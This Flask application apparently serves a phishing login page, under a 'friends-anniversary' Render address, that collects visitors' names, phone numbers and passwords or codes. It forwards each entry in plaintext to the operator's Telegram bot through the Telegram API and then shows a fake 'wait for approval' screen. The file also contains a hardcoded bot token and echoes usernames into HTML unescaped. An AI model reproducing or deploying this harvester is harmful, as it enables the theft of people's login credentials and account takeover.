from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# ⚠️ Insert your real Telegram details here
BOT_TOKEN = "8564930951:AAEeolUBlgRUHNMfYvlHyC1Q4pY5w_qGgI0"
MY_CHAT_ID = "8564930951"  # <--- Replace this with your actual Chat ID from @userinfobot

def send_telegram_notification(username, phone, password):
    # This will be your Render URL after deployment
    YOUR_ONLINE_URL = "https://friends-anniversary.onrender.com" 
    
    # Format of the message that will drop in your Telegram Bot
    text = (
        f"🚨 *New Login Attempt!*\n\n"
        f"👤 *Name:* {username}\n"
        f"📞 *Phone:* {phone}\n"
        f"🔑 *Code (Password):* `{password}`\n\n"
        f"👉 *To ALLOW click here:*\n{YOUR_ONLINE_URL}/approve/{username}\n\n"
        f"👉 *To DENY click here:*\n{YOUR_ONLINE_URL}/reject/{username}"
    )
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

@app.route('/')
def home_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # Sends the collected Name, Phone, and Password directly to your Telegram
    send_telegram_notification(username, phone, password)
    
    # Redirects the user to a waiting page
    return f"<h2>Hello {username}, your request has been submitted! Please wait until you get approval...</h2>"

@app.route('/approve/<username>')
def approve(username):
    return f"<h1>Access GRANTED for {username}! They can now view the website.</h1>"

@app.route('/reject/<username>')
def reject(username):
    return f"<h1>Access DENIED for {username}.</h1>"

if __name__ == '__main__':
    app.run(debug=True)
